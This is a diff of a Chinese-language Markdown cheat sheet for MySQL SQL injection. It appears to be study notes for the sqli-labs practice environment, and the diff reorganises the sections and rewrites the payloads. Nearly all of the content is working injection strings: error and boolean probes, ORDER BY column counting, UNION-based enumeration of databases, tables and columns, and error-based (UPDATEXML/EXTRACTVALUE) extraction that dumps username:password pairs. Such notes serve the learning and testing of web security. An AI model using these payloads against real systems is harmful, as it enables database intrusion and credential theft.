@@ -149,36 +149,36 @@ SELECT * FROM users WHERE id = "%1%";
 ```
 
 ```
-?id=1\  # error
-?id=1'  # error
-?id=1"  # error
-?id=1)  # error
-?id=1') # error
-?id=1") # error
-?id=1 OR 1=1      # true
-?id=1 AND 1=2     # false
-?id=1 OR 1=1 --   # true
-?id=1 AND 1=2 --  # false
-?id=1' OR 1=1      # true
-?id=1' AND 1=2     # false
-?id=1' OR 1=1 --   # true
-?id=1' AND 1=2 --  # false
-?id=1" OR 1=1      # true
-?id=1" AND 1=2     # false
-?id=1" OR 1=1 --   # true
-?id=1" AND 1=2 --  # false
-?id=1) OR 1=1      # true
-?id=1) AND 1=2     # false
-?id=1) OR 1=1 --   # true
-?id=1) AND 1=2 --  # false
-?id=1') OR 1=1      # true
-?id=1') AND 1=2     # false
-?id=1') OR 1=1 --   # true
-?id=1') AND 1=2 --  # false
-?id=1") OR 1=1      # true
-?id=1") AND 1=2     # false
-?id=1") OR 1=1 --   # true
-?id=1") AND 1=2 --  # false
+NULL\  # error
+NULL'  # error
+NULL"  # error
+NULL)  # error
+NULL') # error
+NULL") # error
+NULL OR 1=1      # true
+NULL AND 1=2     # false
+NULL OR 1=1 --   # true
+NULL AND 1=2 --  # false
+NULL' OR 1=1      # true
+NULL' AND 1=2     # false
+NULL' OR 1=1 --   # true
+NULL' AND 1=2 --  # false
+NULL" OR 1=1      # true
+NULL" AND 1=2     # false
+NULL" OR 1=1 --   # true
+NULL" AND 1=2 --  # false
+NULL) OR 1=1      # true
+NULL) AND 1=2     # false
+NULL) OR 1=1 --   # true
+NULL) AND 1=2 --  # false
+NULL') OR 1=1      # true
+NULL') AND 1=2     # false
+NULL') OR 1=1 --   # true
+NULL') AND 1=2 --  # false
+NULL") OR 1=1      # true
+NULL") AND 1=2     # false
+NULL") OR 1=1 --   # true
+NULL") AND 1=2 --  # false
 ```
 
 ### 4.2.  INSERT/UPDATE
@@ -193,48 +193,175 @@ UPDATE users SET uname = "1" WHERE id = 1;
 ```
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR ' # error
-" OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR " # error
+NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR ' # error
+NULL" OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR " # error
 ```
 
-## 5. Column count
+## 5. UNION
+
+使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
+
+### 5.1 Column count
 
 利用 ORDER BY 判断有几个字段
 
 ```
-?id=1' ORDER BY 4 -- 
+NULL' ORDER BY 4 -- 
 ```
 
 > 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段;
 >
 > 可尝试二分法.
 
-## 6. UNION
-
-使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
-
-### 6.1. Location
+### 5.1. Location
 
 判断回显的位置
 
 ```
-?id=NULL' UNION SELECT 1, 2, 3 -- 
+NULL' UNION SELECT 1, 2, 3 -- 
 ```
 
-> 查询字段必须与 `Column` 相同
+> 查询字段数量必须与 `Column count` 相同
 
-### 6.2. Database
+### 5.2. Database
 
 在有回显的位置显示所有数据库名
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables) -- 
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables) -- 
 ```
 
 在有回显的位置显示当前数据库名
 
 ```
-?id=NULL' UNION SELECT 1, 2, DATABASE() -- 
+NULL' UNION SELECT 1, 2, DATABASE() -- 
+```
+
+亦可查询以下内容
+
+| 操作                 | 描述         |
+| -------------------- | ------------ |
+| VERSION()            | MySQL 版本   |
+| USER()               | 数据库用户名 |
+| DATABASE()           | 数据库名     |
+| @@DATADIR            | 数据库路径   |
+| @@VERSION_COMPILE_OS | 系统版本     |
+
+### 5.3. Tables
+
+获取指定数据库的所有数据表名
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security') -- 
+```
+
+获取当前数据库的所有数据表名
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) -- 
+```
+
+### 5.4. Columns
+
+获取指定数据库中指定数据表的所有字段名
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users') -- 
+```
+
+获取当前数据库中指定数据表的所有字段名
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users') -- 
+```
+
+### 5.5. Dump
+
+获取指定数据库中指定数据表中的所有数据
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users) -- 
+```
+
+获取当前数据库中指定数据表中的所有数据
+
+```
+NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
+```
+
+## 6. Error
+
+报错注入的常用函数
+
+```
+UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0)
+EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e))
+FLOOR()
+```
+
+报错注入经常存在显示不全的问题, 因此需要分段提取
+
+```
+SUBSTRING(string, 1, 2) # 从首个字符开始截取两个字符
+LIMIT 0, 2              # 从首行开始截取两行
+```
+
+### 6.1. Location
+
+判断是否有回显
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, USER(), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(USER(), 1, 1)), 0x7e)) OR '
+```
+
+### 6.2. Database
+
+显示所有数据库名
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 1, 1)), 0x7e)) OR '
+```
+
+显示当前数据库名
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(DATABASE(), 1, 1)), 0x7e)) OR '
 ```
 
 亦可查询以下内容
@@ -252,13 +379,37 @@ UPDATE users SET uname = "1" WHERE id = 1;
 获取指定数据库的所有数据表名
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security') -- 
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema='security' LIMIT 0, 1), 0x7e)) OR '
 ```
 
 获取当前数据库的所有数据表名
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) -- 
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING(table_name, 1, 1) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0, 1), 0x7e)) OR '
 ```
 
 ### 6.4. Columns
@@ -266,112 +417,82 @@ UPDATE users SET uname = "1" WHERE id = 1;
 获取指定数据库中指定数据表的所有字段名
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users') -- 
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 1, 1)), 0x7e)) OR '
 ```
 
 获取当前数据库中指定数据表的所有字段名
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users') -- 
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e)) OR '
+```
+
+```
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e), 0) OR '
+```
+
+```
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 1, 1)), 0x7e)) OR '
 ```
 
 ### 6.5. Dump
 
-获取指定数据库中指定数据表中的所有数据
+获取指定数据库中指定数据表中指定字段名的所有数据
 
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users) -- 
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 0) OR '
 ```
 
-获取当前数据库中指定数据表中的所有数据
-
 ```
-?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e)) OR '
 ```
 
-## 7. Error
-
-### 7.1. Location
-
-判断是否有回显
-
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 0) OR '
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e), 0) OR '
 ```
 
-### 7.2. Database
-
-显示所有数据库名
-
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 0) OR '
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 1, 1)), 0x7e)) OR '
 ```
 
-==???LIMIT 的使用???==
-
-显示当前数据库名
+获取当前数据库中指定数据表中指定字段名的所有数据
 
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 0) OR '
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
 ```
 
-亦可查询以下内容
-
-| 操作                 | 描述         |
-| -------------------- | ------------ |
-| VERSION()            | MySQL 版本   |
-| USER()               | 数据库用户名 |
-| DATABASE()           | 数据库名     |
-| @@DATADIR            | 数据库路径   |
-| @@VERSION_COMPILE_OS | 系统版本     |
-
-### 7.3. Tables
-
-获取指定数据库的所有数据表名
-
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1), 0x7e), 0) OR '
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e)) OR '
 ```
 
-获取当前数据库的所有数据表名
-
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), 0x7e), 0) OR '
+NULL' OR UPDATEXML(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e), 0) OR '
 ```
 
-### 7.4. Columns
-
-获取指定数据库中指定数据表的所有字段名
-
 ```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 0) OR '
+NULL' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT SUBSTRING((SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 1, 1)), 0x7e)) OR '
 ```
 
-获取当前数据库中指定数据表的所有字段名
-
-```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 0) OR '
-```
-
-### 7.5. Dump
-
-获取指定数据库中指定数据表中的所有数据
-
-```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 0) OR '
-```
-
-获取当前数据库中指定数据表中的所有数据
-
-```
-' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 0) OR '
-```
-
-## 8. Bool
+## 7. Bool
 
 当没有回显时，可以根据反馈信息的真假进行注入
 
-### 8.1. 爆库
+### 7.1. 爆库
 
 判断数据库长度
 
@@ -444,10 +565,10 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 判断第一个数据表的长度
 
 ```
-?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() limit 0,1)=1 --+
+?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() LIMIT 0, 1)=1 --+
 ```
 
-### 8.3. 爆字段
+### 7.3. 爆字段
 
 判断字段的个数
 
@@ -461,15 +582,15 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 
 > 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据
 
-### 8.4. 拖库
+### 7.4. 拖库
 
-## 9. Time
+## 8. Time
 
 当反馈信息没有区别时，可以根据响应时间进行注入
 
 > http://192.168.1.76/sqli-labs/Less-8/
 
-### 9.1. 判断是否存在 SQL 注入
+### 8.1. 判断是否存在 SQL 注入
 
 尝试传递特殊字符 `` `
 
@@ -487,7 +608,7 @@ http://192.168.1.76/sqli-labs/Less-8/?id=1'
 http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
 ```
 
-### 9.2. 爆库
+### 8.2. 爆库
 
 判断数据库长度
 
